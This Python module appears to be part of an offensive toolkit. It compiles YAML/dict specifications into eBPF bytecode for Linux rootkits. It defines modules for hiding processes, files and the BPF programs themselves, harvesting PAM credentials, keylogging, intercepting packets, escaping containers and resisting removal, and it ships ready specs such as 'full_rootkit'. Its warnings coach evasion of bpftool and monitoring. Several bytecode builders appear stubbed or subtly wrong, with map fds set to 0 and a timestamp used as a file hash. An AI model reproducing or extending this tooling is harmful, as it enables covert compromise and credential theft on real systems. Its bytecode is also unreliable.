"""
BPF Payload Compiler — Domain-Specific Language for BPF attack generation.

Write attack specifications in YAML/dict format, compile to real eBPF bytecode.
The DSL abstracts away BPF ISA details while producing valid, loadable programs.

Example YAML:
  payload:
    name: stealth_rootkit
    targets:
      hide_pids: [1337, 4242]
      hide_files: [".backdoor", "rootkit.so"]
    modules:
      - type: process_hider
      - type: credential_harvester
        exfil: ringbuf
      - type: file_hider
      - type: self_hider
    options:
      kill_switch: true
      persistence: true
      evasion: io_uring
"""
import copy
import hashlib
import time
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Union

from ..core.bpf_bytecode import (
    BPFProgram, BPFMapDef, BPFInsn,
    BPFProgType, BPFMapType, BPFHelper, BPFReg,
    BPFClass, BPFOp, BPFJmp, BPFSrc, BPFSize,
    mov64_imm, mov64_reg, add64_imm, sub64_imm,
    and64_imm, or64_imm, xor64_imm, lsh64_imm,
    ldx_mem, stx_mem, st_mem, lddw,
    call_helper, exit_prog, jeq_imm, jne_imm, jgt_imm, jge_imm, ja,
)
from ..core.elf_generator import generate_bpf_elf, hash_bpf_program


# ============================================================================
# DSL Schema
# ============================================================================

MODULE_TYPES = {
    "process_hider": {
        "prog_type": BPFProgType.KPROBE,
        "attach": "__x64_sys_getdents64",
        "description": "Hide processes from /proc enumeration",
        "mitre": "T1564.001",
        "capabilities": ["CAP_BPF", "CAP_SYS_ADMIN"],
    },
    "file_hider": {
        "prog_type": BPFProgType.TRACEPOINT,
        "attach": "syscalls/sys_exit_getdents64",
        "description": "Hide files from directory listings",
        "mitre": "T1564.001",
        "capabilities": ["CAP_BPF"],
    },
    "credential_harvester": {
        "prog_type": BPFProgType.KPROBE,
        "attach": "pam_sm_authenticate",
        "description": "Capture authentication credentials",
        "mitre": "T1056.001",
        "capabilities": ["CAP_BPF", "CAP_PERFMON"],
    },
    "keylogger": {
        "prog_type": BPFProgType.TRACEPOINT,
        "attach": "syscalls/sys_enter_write",
        "description": "Capture TTY keystrokes",
        "mitre": "T1056.001",
        "capabilities": ["CAP_BPF"],
    },
    "network_interceptor": {
        "prog_type": BPFProgType.XDP,
        "attach": "eth0",
        "description": "XDP-level packet interception",
        "mitre": "T1557",
        "capabilities": ["CAP_BPF", "CAP_NET_ADMIN"],
    },
    "container_escape": {
        "prog_type": BPFProgType.CGROUP_SKB,
        "attach": "/sys/fs/cgroup/docker",
        "description": "Bypass container network policies",
        "mitre": "T1611",
        "capabilities": ["CAP_BPF", "CAP_NET_ADMIN"],
    },
    "syscall_hook": {
        "prog_type": BPFProgType.KPROBE,
        "attach": "__x64_sys_read",
        "description": "Intercept syscall arguments and data",
        "mitre": "T1059",
        "capabilities": ["CAP_BPF", "CAP_PERFMON"],
    },
    "self_hider": {
        "prog_type": BPFProgType.TRACING,
        "attach": "bpf_prog_get_info_by_fd",
        "description": "Hide BPF programs from enumeration",
        "mitre": "T1014",
        "capabilities": ["CAP_BPF"],
    },
    "persistence": {
        "prog_type": BPFProgType.KPROBE,
        "attach": "__x64_sys_bpf",
        "description": "Monitor and prevent rootkit removal",
        "mitre": "T1547",
        "capabilities": ["CAP_BPF"],
    },
}

EXFIL_METHODS = {
    "ringbuf": {
        "map_type": BPFMapType.RINGBUF,
        "helpers": [BPFHelper.RINGBUF_RESERVE, BPFHelper.RINGBUF_SUBMIT],
        "description": "Zero-copy ring buffer (kernel 5.8+)",
    },
    "perf_event": {
        "map_type": BPFMapType.PERF_EVENT_ARRAY,
        "helpers": [BPFHelper.PERF_EVENT_OUTPUT],
        "description": "Perf event array (kernel 4.4+)",
    },
    "map_exfil": {
        "map_type": BPFMapType.HASH,
        "helpers": [BPFHelper.MAP_UPDATE_ELEM],
        "description": "Hash map polling from userspace",
    },
}

EVASION_MODES = {
    "none": "No evasion applied",
    "io_uring": "Use io_uring to bypass tracepoint monitoring",
    "timing": "Delayed activation to avoid initial scanning",
    "stealth": "Minimal footprint, reduced helper usage",
}


@dataclass
class PayloadModule:
    """A single module in a compiled payload."""
    module_type: str = ""
    program: BPFProgram = field(default_factory=BPFProgram)
    maps: List[BPFMapDef] = field(default_factory=list)
    config: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "type": self.module_type,
            "prog_type": self.program.prog_type.name,
            "attach_point": self.program.attach_point,
            "instructions": self.program.insn_count(),
            "bytecode_size": len(self.program.bytecode()),
            "maps": len(self.maps),
        }


@dataclass
class CompiledPayload:
    """Result of compiling a DSL payload specification."""
    name: str = ""
    modules: List[PayloadModule] = field(default_factory=list)
    shared_maps: List[BPFMapDef] = field(default_factory=list)
    spec: Dict[str, Any] = field(default_factory=dict)
    compile_time: float = 0.0
    payload_hash: str = ""
    warnings: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    def total_instructions(self) -> int:
        return sum(m.program.insn_count() for m in self.modules)

    def total_bytecode(self) -> int:
        return sum(len(m.program.bytecode()) for m in self.modules)

    def required_capabilities(self) -> set:
        caps = set()
        for mod in self.modules:
            meta = MODULE_TYPES.get(mod.module_type, {})
            for cap in meta.get("capabilities", []):
                caps.add(cap)
        return caps

    def mitre_techniques(self) -> set:
        techniques = set()
        for mod in self.modules:
            meta = MODULE_TYPES.get(mod.module_type, {})
            if "mitre" in meta:
                techniques.add(meta["mitre"])
        return techniques

    def generate_elfs(self) -> Dict[str, bytes]:
        elfs = {}
        for mod in self.modules:
            fname = f"{mod.program.name}.o"
            elfs[fname] = generate_bpf_elf(mod.program)
        return elfs

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "payload_hash": self.payload_hash,
            "compile_time": time.strftime("%Y-%m-%d %H:%M:%S",
                                          time.localtime(self.compile_time)),
            "total_modules": len(self.modules),
            "total_instructions": self.total_instructions(),
            "total_bytecode": self.total_bytecode(),
            "required_capabilities": sorted(self.required_capabilities()),
            "mitre_techniques": sorted(self.mitre_techniques()),
            "modules": [m.to_dict() for m in self.modules],
            "shared_maps": len(self.shared_maps),
            "warnings": self.warnings,
            "errors": self.errors,
        }


# ============================================================================
# Bytecode builders for each module type
# ============================================================================

def _compile_process_hider(spec: Dict, shared_maps: List[BPFMapDef],
                           name_prefix: str) -> PayloadModule:
    prog = BPFProgram(
        name=f"{name_prefix}_proc_hide",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_getdents64",
    )
    for m in shared_maps:
        prog.add_map(m)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    # Lookup PID in target map
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 2))
    # Override return to hide
    prog.add_insn(mov64_imm(BPFReg.R2, 0))
    prog.add_insn(call_helper(BPFHelper.OVERRIDE_RETURN))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return PayloadModule(module_type="process_hider", program=prog,
                         maps=list(shared_maps))


def _compile_file_hider(spec: Dict, shared_maps: List[BPFMapDef],
                        name_prefix: str) -> PayloadModule:
    prog = BPFProgram(
        name=f"{name_prefix}_file_hide",
        prog_type=BPFProgType.TRACEPOINT,
        attach_point="syscalls/sys_exit_getdents64",
    )
    for m in shared_maps:
        prog.add_map(m)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 16))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    # Lookup filename hash in hidden files map
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -8))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -8))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return PayloadModule(module_type="file_hider", program=prog,
                         maps=list(shared_maps))


def _compile_credential_harvester(spec: Dict, shared_maps: List[BPFMapDef],
                                   name_prefix: str) -> PayloadModule:
    exfil = spec.get("exfil", "ringbuf")
    prog = BPFProgram(
        name=f"{name_prefix}_cred_harvest",
        prog_type=BPFProgType.KPROBE,
        attach_point="pam_sm_authenticate",
    )
    for m in shared_maps:
        prog.add_map(m)

    # Capture PID, UID, timestamp, comm
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_UID_GID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -16))
    prog.add_insn(mov64_imm(BPFReg.R2, 16))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_COMM))
    # Store event on stack
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R6, -48))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R7, -40))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -32))

    if exfil == "ringbuf":
        prog.add_insn(lddw(BPFReg.R1, 0))
        prog.add_insn(mov64_imm(BPFReg.R2, 48))
        prog.add_insn(mov64_imm(BPFReg.R3, 0))
        prog.add_insn(call_helper(BPFHelper.RINGBUF_RESERVE))
        prog.add_insn(jeq_imm(BPFReg.R0, 0, 1))
        prog.add_insn(call_helper(BPFHelper.RINGBUF_SUBMIT))
    else:
        prog.add_insn(mov64_reg(BPFReg.R4, BPFReg.R10))
        prog.add_insn(add64_imm(BPFReg.R4, -48))
        prog.add_insn(mov64_imm(BPFReg.R5, 48))
        prog.add_insn(call_helper(BPFHelper.PERF_EVENT_OUTPUT))

    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return PayloadModule(module_type="credential_harvester", program=prog,
                         maps=list(shared_maps), config={"exfil": exfil})


def _compile_keylogger(spec: Dict, shared_maps: List[BPFMapDef],
                       name_prefix: str) -> PayloadModule:
    prog = BPFProgram(
        name=f"{name_prefix}_keylog",
        prog_type=BPFProgType.TRACEPOINT,
        attach_point="syscalls/sys_enter_write",
    )
    for m in shared_maps:
        prog.add_map(m)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 16))
    prog.add_insn(jgt_imm(BPFReg.R7, 2, 5))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -16))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R0, -8))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return PayloadModule(module_type="keylogger", program=prog,
                         maps=list(shared_maps))


def _compile_network_interceptor(spec: Dict, shared_maps: List[BPFMapDef],
                                  name_prefix: str) -> PayloadModule:
    iface = spec.get("interface", "eth0")
    prog = BPFProgram(
        name=f"{name_prefix}_xdp",
        prog_type=BPFProgType.XDP,
        attach_point=iface,
    )
    for m in shared_maps:
        prog.add_map(m)

    # Parse eth+ip+tcp headers
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R7, BPFReg.R6, 0))
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R8, BPFReg.R6, 4))
    prog.add_insn(mov64_reg(BPFReg.R9, BPFReg.R7))
    prog.add_insn(add64_imm(BPFReg.R9, 54))
    prog.add_insn(jgt_imm(BPFReg.R9, 0, 2))
    prog.add_insn(mov64_imm(BPFReg.R0, 2))  # XDP_PASS
    prog.add_insn(exit_prog())
    # Read IP protocol
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R7))
    prog.add_insn(add64_imm(BPFReg.R1, 23))
    prog.add_insn(ldx_mem(BPFSize.B, BPFReg.R2, BPFReg.R1, 0))
    prog.add_insn(jne_imm(BPFReg.R2, 6, 2))
    prog.add_insn(mov64_imm(BPFReg.R0, 2))
    prog.add_insn(exit_prog())
    # Read dst port, lookup in config map
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R7))
    prog.add_insn(add64_imm(BPFReg.R1, 36))
    prog.add_insn(ldx_mem(BPFSize.H, BPFReg.R3, BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R3, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(mov64_imm(BPFReg.R0, 2))
    prog.add_insn(exit_prog())

    return PayloadModule(module_type="network_interceptor", program=prog,
                         maps=list(shared_maps), config={"interface": iface})


def _compile_container_escape(spec: Dict, shared_maps: List[BPFMapDef],
                               name_prefix: str) -> PayloadModule:
    prog = BPFProgram(
        name=f"{name_prefix}_cgroup_escape",
        prog_type=BPFProgType.CGROUP_SKB,
        attach_point="/sys/fs/cgroup/docker",
    )
    for m in shared_maps:
        prog.add_map(m)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R8, BPFReg.R6, 76))
    prog.add_insn(mov64_imm(BPFReg.R0, 1))  # allow
    prog.add_insn(exit_prog())

    return PayloadModule(module_type="container_escape", program=prog,
                         maps=list(shared_maps))


def _compile_syscall_hook(spec: Dict, shared_maps: List[BPFMapDef],
                          name_prefix: str) -> PayloadModule:
    syscall = spec.get("syscall", "__x64_sys_read")
    prog = BPFProgram(
        name=f"{name_prefix}_syscall_hook",
        prog_type=BPFProgType.KPROBE,
        attach_point=syscall,
    )
    for m in shared_maps:
        prog.add_map(m)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 112))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R8, BPFReg.R6, 104))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R9, BPFReg.R6, 96))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R0, -32))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R7, -24))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -16))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R9, -8))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return PayloadModule(module_type="syscall_hook", program=prog,
                         maps=list(shared_maps), config={"syscall": syscall})


def _compile_self_hider(spec: Dict, shared_maps: List[BPFMapDef],
                        name_prefix: str) -> PayloadModule:
    prog = BPFProgram(
        name=f"{name_prefix}_self_hide",
        prog_type=BPFProgType.TRACING,
        attach_point="bpf_prog_get_info_by_fd",
    )
    for m in shared_maps:
        prog.add_map(m)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return PayloadModule(module_type="self_hider", program=prog,
                         maps=list(shared_maps))


def _compile_persistence(spec: Dict, shared_maps: List[BPFMapDef],
                         name_prefix: str) -> PayloadModule:
    prog = BPFProgram(
        name=f"{name_prefix}_persist",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_bpf",
    )
    for m in shared_maps:
        prog.add_map(m)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 112))
    # BPF_PROG_DETACH=8, BPF_LINK_DETACH=34
    prog.add_insn(jeq_imm(BPFReg.R7, 8, 1))
    prog.add_insn(jne_imm(BPFReg.R7, 34, 4))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -16))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R0, -8))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return PayloadModule(module_type="persistence", program=prog,
                         maps=list(shared_maps))


MODULE_COMPILERS = {
    "process_hider": _compile_process_hider,
    "file_hider": _compile_file_hider,
    "credential_harvester": _compile_credential_harvester,
    "keylogger": _compile_keylogger,
    "network_interceptor": _compile_network_interceptor,
    "container_escape": _compile_container_escape,
    "syscall_hook": _compile_syscall_hook,
    "self_hider": _compile_self_hider,
    "persistence": _compile_persistence,
}


# ============================================================================
# Payload Compiler
# ============================================================================

class PayloadCompiler:
    """Compile DSL payload specifications into real BPF bytecode."""

    EXAMPLE_SPECS = {
        "stealth_rootkit": {
            "payload": {
                "name": "stealth_rootkit",
                "targets": {
                    "hide_pids": [1337, 4242],
                    "hide_files": [".backdoor", "rootkit.so"],
                },
                "modules": [
                    {"type": "process_hider"},
                    {"type": "file_hider"},
                    {"type": "self_hider"},
                    {"type": "persistence"},
                ],
                "options": {
                    "kill_switch": True,
                    "exfil": "ringbuf",
                    "evasion": "stealth",
                },
            },
        },
        "credential_kit": {
            "payload": {
                "name": "credential_kit",
                "targets": {"hide_pids": [9999]},
                "modules": [
                    {"type": "credential_harvester", "exfil": "ringbuf"},
                    {"type": "keylogger"},
                    {"type": "self_hider"},
                ],
                "options": {"kill_switch": True, "exfil": "ringbuf"},
            },
        },
        "network_implant": {
            "payload": {
                "name": "network_implant",
                "targets": {"hide_pids": [31337]},
                "modules": [
                    {"type": "network_interceptor", "interface": "eth0"},
                    {"type": "syscall_hook", "syscall": "__x64_sys_connect"},
                    {"type": "process_hider"},
                    {"type": "self_hider"},
                ],
                "options": {"kill_switch": True, "exfil": "perf_event"},
            },
        },
        "full_rootkit": {
            "payload": {
                "name": "full_rootkit",
                "targets": {
                    "hide_pids": [1337],
                    "hide_files": [".rk", "libhook.so", ".config_rk"],
                },
                "modules": [
                    {"type": "process_hider"},
                    {"type": "file_hider"},
                    {"type": "credential_harvester", "exfil": "ringbuf"},
                    {"type": "keylogger"},
                    {"type": "network_interceptor"},
                    {"type": "container_escape"},
                    {"type": "self_hider"},
                    {"type": "persistence"},
                ],
                "options": {
                    "kill_switch": True,
                    "exfil": "ringbuf",
                    "evasion": "io_uring",
                },
            },
        },
    }

    def __init__(self):
        self.compilations: List[CompiledPayload] = []

    def compile(self, spec: Dict[str, Any]) -> CompiledPayload:
        """Compile a DSL payload specification to BPF bytecode."""
        payload_spec = spec.get("payload", spec)
        name = payload_spec.get("name", "payload")
        targets = payload_spec.get("targets", {})
        modules_spec = payload_spec.get("modules", [])
        options = payload_spec.get("options", {})

        result = CompiledPayload(
            name=name, spec=spec, compile_time=time.time(),
        )

        # Validate
        if not modules_spec:
            result.errors.append("No modules specified")
            return result

        for mod_spec in modules_spec:
            mod_type = mod_spec.get("type", "")
            if mod_type not in MODULE_COMPILERS:
                result.errors.append(f"Unknown module type: {mod_type}")

        if result.errors:
            return result

        # Build shared maps
        exfil_method = options.get("exfil", "ringbuf")
        shared_maps = self._build_shared_maps(targets, options, exfil_method)
        result.shared_maps = shared_maps

        # Compile each module
        for mod_spec in modules_spec:
            mod_type = mod_spec["type"]
            compiler = MODULE_COMPILERS[mod_type]
            module = compiler(mod_spec, shared_maps, name)
            result.modules.append(module)

        # Compute payload hash
        hasher = hashlib.sha256()
        for mod in result.modules:
            hasher.update(mod.program.bytecode())
        result.payload_hash = hasher.hexdigest()

        # Warnings
        if not any(m.module_type == "self_hider" for m in result.modules):
            result.warnings.append("No self_hider module — rootkit programs "
                                   "will be visible to bpftool")
        if not options.get("kill_switch"):
            result.warnings.append("No kill switch — rootkit cannot be "
                                   "remotely deactivated")
        if len(result.modules) > 6:
            result.warnings.append(f"{len(result.modules)} modules — high "
                                   "BPF program count may attract attention")

        self.compilations.append(result)
        return result

    def compile_example(self, example_name: str) -> CompiledPayload:
        """Compile a built-in example specification."""
        if example_name not in self.EXAMPLE_SPECS:
            result = CompiledPayload(name=example_name)
            result.errors.append(
                f"Unknown example: {example_name}. "
                f"Available: {', '.join(self.EXAMPLE_SPECS.keys())}"
            )
            return result
        return self.compile(self.EXAMPLE_SPECS[example_name])

    def compile_yaml_string(self, yaml_str: str) -> CompiledPayload:
        """Compile from a YAML-like string (actually JSON for portability)."""
        try:
            spec = json.loads(yaml_str)
        except json.JSONDecodeError as e:
            result = CompiledPayload(name="parse_error")
            result.errors.append(f"JSON parse error: {e}")
            return result
        return self.compile(spec)

    def _build_shared_maps(self, targets: Dict, options: Dict,
                           exfil_method: str) -> List[BPFMapDef]:
        maps = []

        # Config map
        maps.append(BPFMapDef(
            name="pl_config", map_type=BPFMapType.HASH,
            key_size=4, value_size=8, max_entries=64,
        ))

        # Target PIDs
        hide_pids = targets.get("hide_pids", [])
        maps.append(BPFMapDef(
            name="pl_target_pids", map_type=BPFMapType.HASH,
            key_size=4, value_size=4,
            max_entries=max(len(hide_pids) * 2, 32),
        ))

        # Hidden files
        hide_files = targets.get("hide_files", [])
        if hide_files:
            maps.append(BPFMapDef(
                name="pl_hidden_files", map_type=BPFMapType.HASH,
                key_size=8, value_size=1,
                max_entries=max(len(hide_files) * 2, 32),
            ))

        # Exfil channel
        exfil_info = EXFIL_METHODS.get(exfil_method, EXFIL_METHODS["ringbuf"])
        if exfil_info["map_type"] == BPFMapType.RINGBUF:
            maps.append(BPFMapDef(
                name="pl_exfil", map_type=BPFMapType.RINGBUF,
                key_size=0, value_size=0, max_entries=256 * 1024,
            ))
        elif exfil_info["map_type"] == BPFMapType.PERF_EVENT_ARRAY:
            maps.append(BPFMapDef(
                name="pl_exfil", map_type=BPFMapType.PERF_EVENT_ARRAY,
                key_size=4, value_size=4, max_entries=128,
            ))
        else:
            maps.append(BPFMapDef(
                name="pl_exfil", map_type=BPFMapType.HASH,
                key_size=8, value_size=256, max_entries=1024,
            ))

        # Kill switch
        if options.get("kill_switch"):
            maps.append(BPFMapDef(
                name="pl_killswitch", map_type=BPFMapType.ARRAY,
                key_size=4, value_size=1, max_entries=1,
            ))

        return maps

    def list_module_types(self) -> Dict[str, dict]:
        return {
            name: {
                "prog_type": info["prog_type"].name,
                "attach": info["attach"],
                "description": info["description"],
                "mitre": info["mitre"],
                "capabilities": info["capabilities"],
            }
            for name, info in MODULE_TYPES.items()
        }

    def list_examples(self) -> Dict[str, dict]:
        result = {}
        for name, spec in self.EXAMPLE_SPECS.items():
            p = spec["payload"]
            result[name] = {
                "modules": [m["type"] for m in p["modules"]],
                "description": f"{len(p['modules'])} modules, "
                               f"exfil={p.get('options', {}).get('exfil', 'ringbuf')}",
            }
        return result
